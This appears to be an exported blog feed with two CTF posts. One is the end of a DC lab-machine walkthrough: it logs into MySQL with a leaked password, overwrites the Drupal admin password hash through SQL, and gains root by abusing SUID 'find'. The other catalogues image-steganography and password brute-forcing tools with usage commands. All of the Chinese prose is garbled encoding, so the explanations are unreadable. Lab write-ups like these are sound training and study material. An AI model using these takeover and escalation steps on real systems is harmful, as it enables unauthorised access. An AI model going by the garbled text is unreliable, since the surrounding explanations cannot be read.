class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mysql -u dbuser -p</span><br><span class="line">æ ¹æ®ä¸Šé¢å¾—çŸ¥çš„ä¿¡æ¯è¾“å…¥å¯†ç ï¼šR0ck3t</span><br><span class="line">show databases;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1413717378.png"></p><p>æ¥ç€æŸ¥è¯¢æ•°æ®åº“ä¿¡æ¯</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use drupaldb;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3575639081.png"></p><p>æ¥ç€æŸ¥è¡¨</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show tables;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1174575635.png"></p><p>å‘ç°å…³é”®ä¿¡æ¯usersï¼ŒæŸ¥è¯¢é‡Œé¢çš„å­—æ®µ</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from users;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1026973591.png"></p><p>å¾—å‡ºè´¦å·å¯†ç ï¼Œä½†æ˜¯å¯†ç æ˜¯hashåŠ å¯†è¿‡çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬åªèƒ½ç”Ÿæˆä¸€ä¸ªå¯†ç å¹¶å¾—åˆ°å…¶hashå€¼è¿›è¡Œæ›¿æ¢</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">php .&#x2F;scripts&#x2F;password-hash.sh 123456</span><br><span class="line">UPDATE users SET pass &#x3D; &#39;$S$DCJ9lkm5vxZFYzL4GsDQnRiKBURAPyzOv7gz3Zb&#x2F;q9ZrOuZZ7Paf&#39; where uid&#x3D;1;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3625564732.png"></p><p>æœ€åæˆåŠŸç™»å½•è¿›å»å¾—åˆ°flag3<br><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1912687939.png"></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3889874170.png"></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/775524102.png"></p><p>æç¤ºæˆ‘ä»¬ï¼šç‰¹æ®Šçš„PERMSå¯ä»¥å¸®åŠ©æ‰¾åˆ°å¯†ç -ä½†æ‚¨éœ€è¦-execè¯¥å‘½ä»¤æ¥ç¡®å®šå¦‚ä½•è·å–éšè—çš„å†…å®¹ã€‚<br>é€šè¿‡ <code>find / -perm -4000</code> å¯»æ‰¾æƒé™æ˜¯-4000çš„æ–‡ä»¶å³æŸ¥æ‰¾æœ‰ç‰¹æ®Šæƒé™çš„å‘½ä»¤<br><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3168087153.png"></p><p>åˆ©ç”¨findææƒè·å–rootæƒé™ï¼Œå¾—åˆ°flag4<br><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/565400426.png"></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3079080422.png"></p>]]></content>
      
      
      <categories>
          
          <category> ç¬”è®° </category>
          
      </categories>
      
      
        <tags>
            
            <tag> DC </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF-å›¾ç‰‡éšå†™é‚£äº›äº‹å„¿</title>
      <link href="2021/02/28/CTF-%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99%E9%82%A3%E4%BA%9B%E4%BA%8B%E5%84%BF/"/>
      <url>2021/02/28/CTF-%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99%E9%82%A3%E4%BA%9B%E4%BA%8B%E5%84%BF/</url>
      
        <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>æ‡’ç‹—ä»Šå¤©å†³å®šæ•´ç†ä¸€ä¸‹å›¾ç‰‡éšå†™ä¸Šçš„ä¸€äº›å·¥å…·<br><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2608330498.png" alt="æˆ‘å¯æ²¡è¾£ä¹ˆç®€å•.png"></p><h2 id="1-F5-steganography"><a href="#1-F5-steganography" class="headerlink" title="1.F5-steganography"></a>1.F5-steganography</h2><p>ä¸€æ¬¾F5éšå†™å·¥å…·ï¼ˆkaliï¼‰ï¼ˆPSï¼šéœ€è¦å¯†ç ï¼‰</p><p>kaliå®‰è£…å‘½ä»¤ï¼ˆä¹Ÿå¯ç›´æ¥ä¸‹è½½ï¼‰ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;matthewgao&#x2F;F5-steganography</span><br></pre></td></tr></table></figure><p>åŠ å¯†ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java Embed åŸå›¾.jpg ç”Ÿæˆå›¾.jpg -e éšè—çš„æ–‡ä»¶.txt -p &#39;å¯†ç &#39;</span><br></pre></td></tr></table></figure><p>è§£å¯†ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java Extract ç”Ÿæˆå›¾.jpg -p &#39;å¯†ç &#39;</span><br></pre></td></tr></table></figure><p>ä¸¾ä¸ªæ —å­å§~</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2261313197.png" alt="img"></p><h2 id="2-steghide"><a href="#2-steghide" class="headerlink" title="2.steghide"></a>2.steghide</h2><p>Steghideæ˜¯ä¸€ç§éšå†™ç¨‹åºï¼Œèƒ½å¤Ÿéšè—å„ç§å›¾åƒå’ŒéŸ³é¢‘æ–‡ä»¶ä¸­çš„æ•°æ®ã€‚é¢œè‰²æ–¹é¢çš„æ ·æœ¬é¢‘ç‡ä¸ä¼šæ›´æ”¹ï¼Œå› æ­¤ä½¿åµŒå…¥æŠ—ä¸€é˜¶ç»Ÿè®¡æ£€éªŒã€‚</p><h3 id="Windowsä¸‹"><a href="#Windowsä¸‹" class="headerlink" title="Windowsä¸‹"></a><strong>Windowsä¸‹</strong></h3><p>å®˜ç½‘ä¸‹è½½åœ°å€ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;steghide.sourceforge.net&#x2F;download.php</span><br></pre></td></tr></table></figure><p>åŠ å¯†ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">steghide embed -cf .\åŸå›¾.jpg -ef éšè—çš„æ–‡ä»¶.txt</span><br><span class="line">ç„¶åè¿˜è¦è¾“å…¥å¯†ç ï¼Œç¡®è®¤å¯†ç </span><br></pre></td></tr></table></figure><p>è§£å¯†ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">steghide extract -p &#39;å¯†ç &#39; -sf .\ç”Ÿæˆå›¾.jpg</span><br><span class="line">è¾“å…¥ y ç¡®è®¤</span><br></pre></td></tr></table></figure><p>ä¸¾ä¸ªæ —å­å§~</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3150814007.png" alt="img"></p><h3 id="Linux-kaliä¸‹"><a href="#Linux-kaliä¸‹" class="headerlink" title="Linux-kaliä¸‹"></a><strong>Linux-kaliä¸‹</strong></h3><p>ï¼ˆPSï¼šæœ¬äººç”¨çš„æ˜¯winä¸‹çš„ï¼Œä»¥ä¸‹è¿‡ç¨‹çš†æ¥è‡ªç½‘ç»œ.jpgï¼‰<br>å®‰è£…å‘½ä»¤ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install stegdetect</span><br></pre></td></tr></table></figure><p>åŠ å¯†ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">å°† éšè—çš„æ–‡ä»¶.txt æ–‡ä»¶éšè—åˆ° åŸå›¾.jpg ä¸­</span><br><span class="line">steghide embed -cf åŸå›¾.jpg -ef éšè—çš„æ–‡ä»¶.txt [-p å¯†ç ]</span><br></pre></td></tr></table></figure><p>è§£å¯†ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">æŸ¥çœ‹å›¾ç‰‡ä¸­åµŒå…¥çš„æ–‡ä»¶ä¿¡æ¯</span><br><span class="line">steghide info ç”Ÿæˆå›¾.jpg</span><br><span class="line">æå–å«æœ‰å¯†ç çš„éšè—å†…å®¹</span><br><span class="line">steghide extract -sf ç”Ÿæˆå›¾.jpg -p å¯†ç </span><br><span class="line">æå–ä¸å«æœ‰å¯†ç çš„éšè—å†…å®¹</span><br><span class="line">steghide extract -sf ç”Ÿæˆå›¾.jpg</span><br></pre></td></tr></table></figure><p>steghideçˆ†ç ´å¯†ç ï¼š</p><blockquote><p>æœ‰äº›é¢˜ç›®ç”¨steghideåŠ å¯†æ–‡ä»¶ä½†æ˜¯ä¸ç»™å¯†ç ï¼Œæ­¤æ—¶å°±éœ€è¦çˆ†ç ´ï¼Œsteghideæœ¬èº«å¹¶ä¸æ”¯æŒçˆ†ç ´ï¼Œéœ€è¦ä¸€äº›å…¶ä»–çš„æ–¹æ³•ï¼š<a href="https://github.com/Va5c0/Steghide-Brute-Force-Tool">https://github.com/Va5c0/Steghide-Brute-Force-Tool</a></p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">éœ€è¦å®‰è£…çš„åº“ï¼šprogressbar</span><br><span class="line">pip install progressbar2</span><br><span class="line">python steg_brute.py -b -d [å­—å…¸] -f [jpg_file]</span><br></pre></td></tr></table></figure><h2 id="3-outguess"><a href="#3-outguess" class="headerlink" title="3.outguess"></a>3.outguess</h2><p>OutGuessæ˜¯ä¸€ç§é€šç”¨çš„éšå†™å·¥å…·ï¼Œå…è®¸æ’å…¥éšè—ä¿¡æ¯åˆ°æ•°æ®æºçš„å†—ä½™ä½ä¸­ã€‚</p><p>kaliå®‰è£…å‘½ä»¤ï¼ˆä¹Ÿå¯ç›´æ¥ä¸‹è½½ï¼‰ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;crorvick&#x2F;outguess</span><br><span class="line">cd outguessçš„ç›®å½•</span><br><span class="line">æ¥ç€ä¸€ä¸ªå°æŠ€å·§ï¼Œå…ˆåˆ‡æ¢åˆ°rootæƒé™ï¼ˆå› ä¸ºæˆ‘æ˜¯kali2020ï¼‰</span><br><span class="line">sudo su</span><br><span class="line">è¾“å…¥å¯†ç </span><br><span class="line">.&#x2F;configure &amp;&amp; make &amp;&amp; make install</span><br><span class="line">å› ä¸ºmakeå°±æ˜¯sudoäº†ï¼Œä½†æ˜¯make installå°±ä¸æ˜¯sudoäº†</span><br></pre></td></tr></table></figure><p>åŠ å¯†ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo su</span><br><span class="line">è¾“å…¥å¯†ç </span><br><span class="line">outguess -k å¯†ç  -d éšè—çš„æ–‡ä»¶.txt ç”Ÿæˆå›¾.jpg åŸå›¾.jpg</span><br></pre></td></tr></table></figure><p>è§£å¯†ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo su</span><br><span class="line">è¾“å…¥å¯†ç </span><br><span class="line">outguess -k &quot;å¯†ç &quot; -r ç”Ÿæˆå›¾.jpg éšè—çš„æ–‡ä»¶.txt</span><br></pre></td></tr></table></figure><p>ä¸¾ä¸ªæ —å­å§~</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1235280654.png" alt="img"></p><h2 id="4-Jphswin"><a href="#4-Jphswin" class="headerlink" title="4.Jphswin"></a>4.Jphswin</h2><p>ä¸€æ¬¾å›¾å½¢åŒ–ç•Œé¢çš„JPHSéšå†™å·¥å…·<br><a href="https://pan.baidu.com/s/1n8rGiHew6U9bxoSAMTT7_w">ä¸‹è½½åœ°å€</a>ï¼ˆæå–ç ï¼šn9aoï¼‰<br>å¯¼å…¥å›¾ç‰‡ï¼ŒåŠ å¯†å°±ç‚¹hideè¾“å…¥å¯†ç ï¼ˆä¹Ÿå¯ä¸ç”¨å¯†ç ï¼‰ç„¶åsaveä¸€ä¸‹å°±å¥½äº†ï¼Œè§£å¯†å°±ç‚¹seekè¾“å…¥å¯†ç ï¼ˆä¹Ÿå¯èƒ½æ²¡å¯†ç ï¼‰<br><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3530729664.png" alt="img"></p><h2 id="5-Stegsolve"><a href="#5-Stegsolve" class="headerlink" title="5.Stegsolve"></a>5.Stegsolve</h2><p>ä¸€æ¬¾ctfä¸­å¸¸ç”¨çš„å›¾å½¢åŒ–å·¥å…·ï¼Œéœ€è¦å®‰è£…javaç¯å¢ƒ<br><a href="https://pan.baidu.com/s/1gWTGmsVxiBntGSWw0eZquw">ä¸‹è½½åœ°å€</a>ï¼ˆæå–ç ï¼šmx09ï¼‰</p><p> <img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2462665452.png" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2115724581.png" alt="img"></p><blockquote><p>1.File Formatï¼šæ–‡ä»¶æ ¼å¼ï¼Œè¿™é‡Œä½ ä¼šçœ‹è§å›¾ç‰‡çš„å…·ä½“ä¿¡æ¯æœ‰æ—¶å€™æœ‰äº›å›¾ç‰‡éšå†™çš„flagä¼šè—åœ¨è¿™é‡Œ<br>2.<strong>Data Extract</strong>ï¼šæ•°æ®æå–å³æŠ½å–å›¾ç‰‡ä¸­éšè—æ•°æ®ï¼Œè¿™ä¸ªåº”è¯¥æ˜¯ç‰¹åˆ«å¸¸ç”¨çš„æ¨¡å—ï¼Œå…·ä½“å¤§å®¶å»ç™¾åº¦/Googleå§ï¼ˆæˆ‘ä¹Ÿè®²ä¸æ¸…æ¥š.jpgï¼‰<br>3.Steregram Solveï¼šç«‹ä½“å›¾è§£å†³ï¼Œå¯ä»¥å·¦å³æ§åˆ¶åç§»ï¼Œå¯ä»¥æ”¾å¼ å›¾ç‰‡è¯•ä¸€ä¸‹å°±çŸ¥é“è¿™ä¸ªæ˜¯ä»€ä¹ˆæ„æ€äº†<br>4.Frame Browserï¼šå¸§æµè§ˆå™¨ï¼Œä¸»è¦æ˜¯å¯¹GIFä¹‹ç±»çš„åŠ¨å›¾è¿›è¡Œåˆ†è§£ï¼ŒæŠŠåŠ¨å›¾ä¸€å¸§å¸§çš„æ”¾ï¼Œå¥½åƒå¯ä»¥ä¿å­˜ä¸‹æ¥<br>5.Image Combinerï¼šå›¾åƒåˆæˆå™¨ä¹Ÿå°±æ˜¯æ‹¼å›¾/å›¾ç‰‡æ‹¼æ¥</p></blockquote><p><a href="https://www.cnblogs.com/cat47/p/11483478.html">stegsolveä½¿ç”¨æ–¹æ³•çš„æ–‡ç« </a></p><h2 id="6-Zsteg"><a href="#6-Zsteg" class="headerlink" title="6.Zsteg"></a>6.Zsteg</h2><p>kaliå®‰è£…å‘½ä»¤ï¼ˆä¹Ÿå¯ç›´æ¥ä¸‹è½½ï¼‰ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;zed-0xff&#x2F;zsteg</span><br><span class="line">cd zsteg&#x2F;</span><br><span class="line">gem install zsteg</span><br></pre></td></tr></table></figure><p>ç”¨æ³•ï¼ˆlsbéšå†™ï¼‰</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">zsteg -a XXX.png &#x2F; zsteg -a XXX.bmp</span><br><span class="line">zsteg -e &quot;b1,rgb,lsb,xy&quot; XXX.png &gt; XXX.zip</span><br></pre></td></tr></table></figure><p>å›é¡¾èµ›é¢˜byDASCTF2020-7</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">zsteg red_blue.png</span><br><span class="line">zsteg red_blue.png -e &#39;b1,r,lsb,xy&#39; &gt; pass.png</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2160594035.png" alt="img"></p><h2 id="7-stegdetect"><a href="#7-stegdetect" class="headerlink" title="7.stegdetect"></a>7.stegdetect</h2><p>Stegdetectä¸»è¦ç”¨äºåˆ†æJPEGæ–‡ä»¶ï¼Œå¯ä»¥æ£€æµ‹åˆ°é€šè¿‡JStegã€JPHideã€OutGuessã€Invisible Secretsã€F5ã€appendXå’ŒCamouflageç­‰è¿™äº›éšå†™å·¥å…·éšè—çš„ä¿¡æ¯ï¼ˆPSï¼šæˆ‘æ²¡ç”¨è¿‡ï¼‰<br>Stegdetecté€šè¿‡ç»Ÿè®¡æµ‹è¯•æ¥åˆ†æå›¾åƒæ–‡ä»¶ä¸­æ˜¯å¦åŒ…å«éšè—å†…å®¹ï¼›è¿è¡Œé™æ€æµ‹è¯•ä»¥åˆ¤æ–­éšè—çš„å†…å®¹æ˜¯å¦å­˜åœ¨ï¼›å°è¯•è¯†åˆ«éšè—å†…å®¹æ˜¯é€šè¿‡å“ªä¸ªéšå†™å·¥å…·åµŒå…¥çš„ã€‚</p><p>kaliå®‰è£…å‘½ä»¤</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install stegdetect</span><br></pre></td></tr></table></figure><p>é£Ÿç”¨æ–¹æ³•ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">å°†å›¾ç‰‡å¤åˆ¶åˆ° stegdetect.exe æ‰€åœ¨æ–‡ä»¶å¤¹ï¼Œæ‰“å¼€ cmd è¾“å…¥ï¼š</span><br><span class="line">stegdetect.exe -tjopi -s 10.0 [stego_file]</span><br><span class="line"></span><br><span class="line">-s ä¿®æ”¹æ£€æµ‹ç®—æ³•çš„æ•æ„Ÿåº¦ï¼Œè¯¥å€¼çš„é»˜è®¤å€¼ä¸º1ã€‚æ£€æµ‹ç»“æœçš„åŒ¹é…åº¦ä¸æ£€æµ‹ç®—æ³•çš„æ•æ„Ÿåº¦æˆæ­£æ¯”ï¼Œç®—æ³•æ•æ„Ÿåº¦çš„å€¼è¶Šå¤§ï¼Œæ£€æµ‹å‡ºçš„å¯ç–‘æ–‡ä»¶åŒ…å«æ•æ„Ÿä¿¡æ¯çš„å¯èƒ½æ€§è¶Šå¤§ã€‚</span><br><span class="line">-t è®¾ç½®è¦æ£€æµ‹å“ªäº›éšå†™å·¥å…·ï¼ˆé»˜è®¤æ£€æµ‹jopiï¼‰ï¼Œå¯è®¾ç½®çš„é€‰é¡¹å¦‚ä¸‹ï¼š</span><br><span class="line">j æ£€æµ‹å›¾åƒä¸­çš„ä¿¡æ¯æ˜¯å¦æ˜¯ç”¨jstegåµŒå…¥çš„ã€‚</span><br><span class="line">o æ£€æµ‹å›¾åƒä¸­çš„ä¿¡æ¯æ˜¯å¦æ˜¯ç”¨outguessåµŒå…¥çš„ã€‚</span><br><span class="line">p æ£€æµ‹å›¾åƒä¸­çš„ä¿¡æ¯æ˜¯å¦æ˜¯ç”¨jphideåµŒå…¥çš„ã€‚</span><br><span class="line">i æ£€æµ‹å›¾åƒä¸­çš„ä¿¡æ¯æ˜¯å¦æ˜¯ç”¨invisible secretsåµŒå…¥çš„ã€‚</span><br><span class="line"></span><br><span class="line">å¦‚æœæ˜¾ç¤ºä¸º [stego_file]ï¼šjphide(***)ï¼Œåˆ™å¯ä»¥ç”¨ stegbreak ç ´è§£å¯†ç </span><br><span class="line">stegbreak -r rules.ini -f password.txt -t p [stego_file]</span><br><span class="line"># password.txtä¸ºè‡ªå¸¦å­—å…¸</span><br><span class="line">Loaded 1 files...</span><br><span class="line">[stego_file]ï¼šjphide[v5](2333)</span><br><span class="line"># 2333ä¸ºè¯¥æ–‡ä»¶jphideçš„å¯†ç </span><br></pre></td></tr></table></figure><blockquote><p>å‚è€ƒæ–‡ç« ï¼š<br><a href="https://www.kancloud.cn/wintry/kali-linux/784110">https://www.kancloud.cn/wintry/kali-linux/784110</a><br><a href="http://www.ga1axy.top/index.php/archives/6/#stegdetect%EF%BC%88%E6%A3%80%E6%9F%A5jpg%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99%E6%96%B9%E6%B3%95win%EF%BC%89">http://www.ga1axy.top/index.php/archives/6/#stegdetect%EF%BC%88%E6%A3%80%E6%9F%A5jpg%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99%E6%96%B9%E6%B3%95win%EF%BC%89</a></p></blockquote><h2 id="8-BlindWaterMark"><a href="#8-BlindWaterMark" class="headerlink" title="8.BlindWaterMark"></a>8.BlindWaterMark</h2><p>ç›²æ°´å°è„šæœ¬-python<br>ä¸‹è½½åœ°å€ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;chishaxie&#x2F;BlindWaterMark</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨å‰éœ€è¦å®‰è£…æ¨¡å—ï¼šcv2ã€matplotlib</p><p>åˆæˆç›²æ°´å°å›¾</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python bwm.py encode hui.png wm.png hui_with_wm.png</span><br></pre></td></tr></table></figure><p>æå–å›¾ä¸­çš„ç›²æ°´å° (éœ€è¦åŸå›¾)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python bwm.py decode hui.png hui_with_wm.png wm_from_hui.png</span><br></pre></td></tr></table></figure><h3 id="é¢‘åŸŸç›²æ°´å°"><a href="#é¢‘åŸŸç›²æ°´å°" class="headerlink" title="é¢‘åŸŸç›²æ°´å°"></a>é¢‘åŸŸç›²æ°´å°</h3><p>å¦‚æœä¸Šé¢é‚£ä¸ªbwmä¸è¡Œå¯ä»¥è¯•è¯•è¿™ä¸ª</p><p>é™„ä¸Šè„šæœ¬</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">import cv2</span><br><span class="line">import numpy as np</span><br><span class="line">import random</span><br><span class="line">import os</span><br><span class="line">from argparse import ArgumentParser</span><br><span class="line"></span><br><span class="line">ALPHA &#x3D; 5</span><br><span class="line"></span><br><span class="line">def build_parser():</span><br><span class="line">    parser &#x3D; ArgumentParser()</span><br><span class="line">    parser.add_argument(&#39;--original&#39;, dest&#x3D;&#39;ori&#39;, required&#x3D;True)</span><br><span class="line">    parser.add_argument(&#39;--image&#39;, dest&#x3D;&#39;img&#39;, required&#x3D;True)</span><br><span class="line">    parser.add_argument(&#39;--result&#39;, dest&#x3D;&#39;res&#39;, required&#x3D;True)</span><br><span class="line">    parser.add_argument(&#39;--alpha&#39;, dest&#x3D;&#39;alpha&#39;, default&#x3D;ALPHA)</span><br><span class="line">    return parser</span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    parser &#x3D; build_parser()</span><br><span class="line">    options &#x3D; parser.parse_args()</span><br><span class="line">    ori &#x3D; options.ori</span><br><span class="line">    img &#x3D; options.img</span><br><span class="line">    res &#x3D; options.res</span><br><span class="line">    alpha &#x3D; options.alpha</span><br><span class="line">    if not os.path.isfile(ori):</span><br><span class="line">        parser.error(&quot;original image %s does not exist.&quot; % ori)</span><br><span class="line">    if not os.path.isfile(img):</span><br><span class="line">        parser.error(&quot;image %s does not exist.&quot; % img)</span><br><span class="line">    decode(ori, img, res, alpha)</span><br><span class="line"></span><br><span class="line">def decode(ori_path, img_path, res_path, alpha):</span><br><span class="line">    ori &#x3D; cv2.imread(ori_path)</span><br><span class="line">    img &#x3D; cv2.imread(img_path)</span><br><span class="line">    ori_f &#x3D; np.fft.fft2(ori)</span><br><span class="line">    img_f &#x3D; np.fft.fft2(img)</span><br><span class="line">    height, width &#x3D; ori.shape[0], ori.shape[1]</span><br><span class="line">    watermark &#x3D; (ori_f - img_f) &#x2F; alpha</span><br><span class="line">    watermark &#x3D; np.real(watermark)</span><br><span class="line">    res &#x3D; np.zeros(watermark.shape)</span><br><span class="line">    random.seed(height + width)</span><br><span class="line">    x &#x3D; range(height &#x2F; 2)</span><br><span class="line">    y &#x3D; range(width)</span><br><span class="line">    random.shuffle(x)</span><br><span class="line">    random.shuffle(y)</span><br><span class="line">    for i in range(height &#x2F; 2):</span><br><span class="line">        for j in range(width):</span><br><span class="line">            res[x[i]][y[j]] &#x3D; watermark[i][j]</span><br><span class="line">    cv2.imwrite(res_path, res, [int(cv2.IMWRITE_JPEG_QUALITY), 100])</span><br><span class="line"></span><br><span class="line">if __name__ &#x3D;&#x3D; &#39;__main__&#39;:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>é£Ÿç”¨æ–¹æ³•</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python pinyubwm.py --original 1.png --image 2.png --result out.png</span><br></pre></td></tr></table></figure><h3 id="Javaç›²æ°´å°"><a href="#Javaç›²æ°´å°" class="headerlink" title="Javaç›²æ°´å°"></a>Javaç›²æ°´å°</h3><p> <a href="https://pan.baidu.com/s/1_96MvGgpUQ0PcJTfrvXzlw">ä¸‹è½½åœ°å€</a>ï¼ˆæå–ç ï¼š3al9ï¼‰</p><p>é£Ÿç”¨æ–¹æ³•ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">åŠ æ–‡å­—æ°´å°:</span><br><span class="line">java -jar BlindWatermark-v0.0.3-windows-x86_64.jar encode -ct åŸå›¾.png æ–‡å­— ç”Ÿæˆå›¾.jpg</span><br><span class="line"></span><br><span class="line">æ–‡å­—æ°´å°è§£ç :</span><br><span class="line">java -jar BlindWatermark-v0.0.3-windows-x86_64.jar decode -c ç”Ÿæˆå›¾.jpg è§£ç å¾—åˆ°çš„æ°´å°å›¾.jpg</span><br><span class="line"></span><br><span class="line">åŠ å›¾ç‰‡æ°´å°:</span><br><span class="line">java -jar BlindWatermark-v0.0.3-windows-x86_64.jar encode -ci åŸå›¾.png æ°´å°å›¾.png 